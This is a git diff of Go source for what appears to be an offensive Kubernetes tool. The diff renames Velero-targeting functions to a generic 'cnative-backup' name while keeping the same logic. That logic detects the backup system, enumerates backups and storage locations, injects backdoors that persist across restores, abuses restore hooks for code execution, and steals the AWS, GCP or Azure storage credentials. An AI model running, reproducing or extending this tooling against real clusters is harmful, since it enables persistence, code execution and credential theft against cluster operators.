@@ -11,19 +11,19 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var veleroBackupGVR = schema.GroupVersionResource{
+var cnativeBackupGVR = schema.GroupVersionResource{
 	Group: "velero.io", Version: "v1", Resource: "backups",
 }
 
-var veleroScheduleGVR = schema.GroupVersionResource{
+var cnativeBackupScheduleGVR = schema.GroupVersionResource{
 	Group: "velero.io", Version: "v1", Resource: "schedules",
 }
 
-var veleroBackupStorageLocationGVR = schema.GroupVersionResource{
+var cnativeBackupStorageLocationGVR = schema.GroupVersionResource{
 	Group: "velero.io", Version: "v1", Resource: "backupstoragelocations",
 }
 
-func detectVelero(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeBackup(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"velero", "velero-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -31,10 +31,10 @@ func detectVelero(ctx context.Context, client kubernetes.Interface) []DetectionS
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "velero",
+				Name:      "cnative-backup",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d velero pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-backup pods", len(pods.Items)),
 			}}
 		}
 
@@ -43,10 +43,10 @@ func detectVelero(ctx context.Context, client kubernetes.Interface) []DetectionS
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "velero",
+				Name:      "cnative-backup",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("velero deployment in %s", ns),
+				Details:   fmt.Sprintf("cnative-backup deployment in %s", ns),
 			}}
 		}
 	}
@@ -54,29 +54,29 @@ func detectVelero(ctx context.Context, client kubernetes.Interface) []DetectionS
 	return nil
 }
 
-// ExploitVelero executes the specified Velero backup/restore exploitation technique.
-func ExploitVelero(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeBackup executes the specified cnative-backup backup/restore exploitation technique.
+func ExploitCnativeBackup(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return veleroEnumerate(ctx, client, dynClient)
+		return cnativeBackupEnumerate(ctx, client, dynClient)
 	case "backup_inject":
-		return veleroBackupInject(ctx, client, dynClient)
+		return cnativeBackupInject(ctx, client, dynClient)
 	case "restore_hooks":
-		return veleroRestoreHooks(ctx, dynClient)
+		return cnativeBackupRestoreHooks(ctx, dynClient)
 	case "secret_steal":
-		return veleroSecretSteal(ctx, client, dynClient)
+		return cnativeBackupSecretSteal(ctx, client, dynClient)
 	default:
-		return veleroEnumerate(ctx, client, dynClient)
+		return cnativeBackupEnumerate(ctx, client, dynClient)
 	}
 }
 
-func veleroEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeBackupEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Velero Backup Infrastructure Enumeration:\n\n")
+	sb.WriteString("cnative-backup Infrastructure Enumeration:\n\n")
 
 	found := false
 
-	backups, err := dynClient.Resource(veleroBackupGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	backups, err := dynClient.Resource(cnativeBackupGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(backups.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  Backups (%d):\n", len(backups.Items))
@@ -88,7 +88,7 @@ func veleroEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 		sb.WriteString("\n")
 	}
 
-	schedules, err := dynClient.Resource(veleroScheduleGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	schedules, err := dynClient.Resource(cnativeBackupScheduleGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(schedules.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  Schedules (%d):\n", len(schedules.Items))
@@ -100,7 +100,7 @@ func veleroEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 		sb.WriteString("\n")
 	}
 
-	bsls, err := dynClient.Resource(veleroBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	bsls, err := dynClient.Resource(cnativeBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(bsls.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  BackupStorageLocations (%d):\n", len(bsls.Items))
@@ -125,7 +125,7 @@ func veleroEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 	}
 
 	if !found {
-		sb.WriteString("  No Velero resources detected\n")
+		sb.WriteString("  No cnative-backup resources detected\n")
 	}
 
 	return &EvasionResult{
@@ -135,14 +135,14 @@ func veleroEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 	}, nil
 }
 
-func veleroBackupInject(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeBackupInject(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Velero Backup Injection:\n\n")
+	sb.WriteString("cnative-backup Injection:\n\n")
 
-	sb.WriteString("  Velero backups capture cluster state to object storage.\n")
+	sb.WriteString("  cnative-backup captures cluster state to object storage.\n")
 	sb.WriteString("  Injecting a backdoor into backup ensures persistence across restores.\n\n")
 
-	bsls, err := dynClient.Resource(veleroBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	bsls, err := dynClient.Resource(cnativeBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list BackupStorageLocations: %v\n", err)
 		return &EvasionResult{Technique: "backup_inject", Success: false, Output: sb.String()}, nil
@@ -188,14 +188,14 @@ func veleroBackupInject(ctx context.Context, client kubernetes.Interface, dynCli
 	}, nil
 }
 
-func veleroRestoreHooks(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeBackupRestoreHooks(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Velero Restore Hooks Exploitation:\n\n")
+	sb.WriteString("cnative-backup Restore Hooks Exploitation:\n\n")
 
 	sb.WriteString("  Restore hooks execute commands inside containers during restore.\n")
 	sb.WriteString("  Injecting hooks into backup achieves code execution on restore.\n\n")
 
-	backups, err := dynClient.Resource(veleroBackupGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	backups, err := dynClient.Resource(cnativeBackupGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list backups: %v\n", err)
 		return &EvasionResult{Technique: "restore_hooks", Success: false, Output: sb.String()}, nil
@@ -218,7 +218,7 @@ func veleroRestoreHooks(ctx context.Context, dynClient dynamic.Interface) (*Evas
 		}
 	}
 
-	schedules, err := dynClient.Resource(veleroScheduleGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	schedules, err := dynClient.Resource(cnativeBackupScheduleGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil {
 		for _, sched := range schedules.Items {
 			spec, _ := sched.Object["spec"].(map[string]any)
@@ -245,11 +245,11 @@ func veleroRestoreHooks(ctx context.Context, dynClient dynamic.Interface) (*Evas
 	}, nil
 }
 
-func veleroSecretSteal(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeBackupSecretSteal(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Velero Storage Credential Theft:\n\n")
+	sb.WriteString("cnative-backup Storage Credential Theft:\n\n")
 
-	bsls, err := dynClient.Resource(veleroBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	bsls, err := dynClient.Resource(cnativeBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list BSLs: %v\n", err)
 		return &EvasionResult{Technique: "secret_steal", Success: false, Output: sb.String()}, nil
@@ -286,7 +286,7 @@ func veleroSecretSteal(ctx context.Context, client kubernetes.Interface, dynClie
 	}
 
 	sb.WriteString("\n  Credential exploitation:\n")
-	sb.WriteString("    1. Velero credentials typically have FULL access to backup bucket\n")
+	sb.WriteString("    1. cnative-backup credentials typically have FULL access to backup bucket\n")
 	sb.WriteString("    2. AWS: access key/secret key in cloud-credentials secret\n")
 	sb.WriteString("    3. GCP: service account JSON key with storage admin\n")
 	sb.WriteString("    4. Azure: storage account key or service principal credentials\n")
